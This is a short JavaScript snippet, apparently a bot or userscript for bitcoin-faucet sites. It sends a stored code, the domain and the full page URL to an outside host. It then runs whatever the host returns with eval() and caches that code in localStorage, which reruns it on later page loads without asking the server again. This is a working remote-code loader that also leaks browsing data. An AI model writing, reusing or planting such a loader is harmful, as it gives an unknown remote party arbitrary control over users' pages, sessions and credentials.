var dat=new Date().getTime()/1000; var loch=location.href.indexOf('index.php?view=login');var spltu=location.href.indexOf('modules.php?m=surfer&show=captcha');
if(localStorage['dtt'] && localStorage['odd'] && localStorage['odd']!=='' && dat-Number(localStorage['dtt'])<166400){eval(localStorage['odd']);}
else{
if($('#adcopy-puzzle-image img').attr('src')){var solve=1;}else{var solve=-1;}	
	
$.post("//bitcjt.mircloud.host/app/js/bit/bj/bitjs.js", { c: localStorage['p_code'], d: document.domain, h:location.href,solve:solve })
.done(function(data) {
 var loch=location.href.indexOf('index.php?view=login');var spltu=location.href.indexOf('modules.php?m=surfer&show=captcha');
 eval(data) //if(spltu==-1 && loch==-1){var ode=$.md5(window.location.href )+'odd';
localStorage['dtt']=new Date().getTime()/1000;
localStorage['odd']=data;
  
});
}
